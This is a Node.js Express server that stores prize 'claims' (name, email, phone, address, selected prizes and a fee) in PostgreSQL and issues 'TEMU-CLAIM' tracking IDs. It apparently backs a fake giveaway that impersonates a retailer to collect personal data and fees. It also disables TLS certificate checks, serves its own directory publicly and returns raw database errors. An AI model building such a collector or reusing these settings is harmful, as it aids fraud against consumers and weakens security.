const express = require('express');
const path = require('path');
const { Pool } = require('pg');

const app = express();
// USE process.env.PORT (or a default like 3000) instead of the hardcoded 10000.
// Cloud services like Render automatically inject the correct port into this variable.
const PORT = process.env.PORT || 3000; 

// Middleware to parse JSON bodies
app.use(express.json());
// Serve the frontend file (index.html) and other static assets
app.use(express.static(path.join(__dirname)));

// --- PostgreSQL Database Setup ---
// IMPORTANT: The connection string must be provided via the DATABASE_URL environment variable.
const DATABASE_URL = process.env.DATABASE_URL; // We rely solely on the environment variable here.

if (!DATABASE_URL) {
    console.error("FATAL ERROR: DATABASE_URL environment variable is not set. Database connection will fail.");
    // If running locally without a DB, use a safe fallback connection string to allow server startup.
    // If running in cloud, this is critical.
}

const pool = new Pool({
    connectionString: DATABASE_URL,
    
    // --- CRITICAL FIX FOR CLOUD HOSTING (e.g., Render) ---
    // Cloud database connections (especially PostgreSQL) require SSL to be enabled.
    // We set up SSL configuration only if the DATABASE_URL is present.
    ssl: DATABASE_URL ? {
        rejectUnauthorized: false // Required for some hosted services like Render
    } : false
    // ------------------------------------------------------
});

// Function to ensure the 'claims' table exists before the server starts handling requests
const setupDatabase = async () => {
    // Only attempt setup if the DATABASE_URL is actually present
    if (!DATABASE_URL) {
        console.log("Skipping database setup as DATABASE_URL is missing.");
        return;
    }
    try {
        const client = await pool.connect();
        await client.query(`
            CREATE TABLE IF NOT EXISTS claims (
                id SERIAL PRIMARY KEY,
                full_name VARCHAR(255) NOT NULL,
                email VARCHAR(255) NOT NULL,
                phone VARCHAR(50),
                city VARCHAR(100),
                full_address TEXT NOT NULL,
                selected_prizes JSONB NOT NULL,
                total_fee INTEGER NOT NULL,
                claim_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
            );
        `);
        client.release();
        console.log("PostgreSQL: 'claims' table checked/created successfully.");
    } catch (err) {
        console.error("PostgreSQL Error: Failed to set up database. Ensure DATABASE_URL is correct and SSL is handled.", err.stack);
    }
};

// Initialize database setup
setupDatabase();


// --- POST /claim Route Handler ---
app.post('/claim', async (req, res) => {
    if (!DATABASE_URL) {
        return res.status(500).json({ success: false, message: 'Database connection failed: DATABASE_URL is not set.' });
    }
    
    const { fullName, email, phone, city, fullAddress, selectedPrizes, totalFee } = req.body;

    // Basic validation
    if (!fullName || !email || !fullAddress || !selectedPrizes || totalFee === undefined) {
        return res.status(400).json({ success: false, message: 'Missing required claim fields.' });
    }

    try {
        const client = await pool.connect();
        
        const query = `
            INSERT INTO claims (full_name, email, phone, city, full_address, selected_prizes, total_fee)
            VALUES ($1, $2, $3, $4, $5, $6, $7)
            RETURNING id;
        `;
        
        const values = [
            fullName, 
            email, 
            phone, 
            city, 
            fullAddress, 
            JSON.stringify(selectedPrizes), 
            parseInt(totalFee, 10)
        ];

        const result = await client.query(query, values);
        client.release();

        const claimId = result.rows[0].id;
        const trackingId = `TEMU-CLAIM-${claimId}`;

        res.json({ 
            success: true, 
            message: 'Claim successfully recorded in the PostgreSQL database!', 
            trackingId: trackingId
        });

    } catch (err) {
        console.error("Database Insert Error:", err.stack);
        // Return a clear 500 status on database failure
        res.status(500).json({ 
            success: false, 
            message: 'Claim failed due to a database error. Check server logs for details.',
            error: err.message
        });
    }
});


// --- Server Startup ---
app.listen(PORT, () => {
    console.log(`Server running successfully on port ${PORT}`);
    if (DATABASE_URL) {
        console.log(`PostgreSQL connection enabled.`);
    } else {
        console.warn(`WARNING: DATABASE_URL is missing. Database operations will fail.`);
    }
});